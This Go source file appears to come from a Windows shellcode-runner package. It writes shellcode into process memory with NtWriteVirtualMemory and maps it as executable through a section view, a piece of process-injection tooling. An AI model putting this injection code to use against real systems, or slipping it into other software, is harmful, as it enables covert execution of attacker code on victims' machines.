//go:build windows

package runsc

import (
	"golang.org/x/sys/windows"

	"github.com/mjwhitta/errors"
	w32 "github.com/mjwhitta/win/api"
)

// Consts for supported copy methods.
const (
	NtWriteVirtualMemory WriteMethod = iota + 1
)

var writeMethods map[WriteMethod]wFunc = map[WriteMethod]wFunc{
	NtWriteVirtualMemory: writeMem,
}

func writeMem(s *state, sc []byte) (*state, error) {
	var e error
	var pHndl windows.Handle = s.proc

	switch s.l.alloc {
	case NtCreateSection:
		pHndl = windows.CurrentProcess()
	}

	if e = w32.NtWriteVirtualMemory(pHndl, s.addr, sc); e != nil {
		e = errors.Newf("failed to write shellcode: %w", e)
		return nil, e
	}

	switch s.l.alloc {
	case NtCreateSection:
		// Create RX view
		s.addr, e = w32.NtMapViewOfSection(
			s.section,
			s.proc,
			uint64(s.sz),
			w32.Accctrl.SubContainersOnlyInherit,
			w32.Winnt.PageExecuteRead,
		)
		if e != nil {
			e = errors.Newf("failed to access memory as RX: %w", e)
			return nil, e
		}
	}

	return s, nil
}
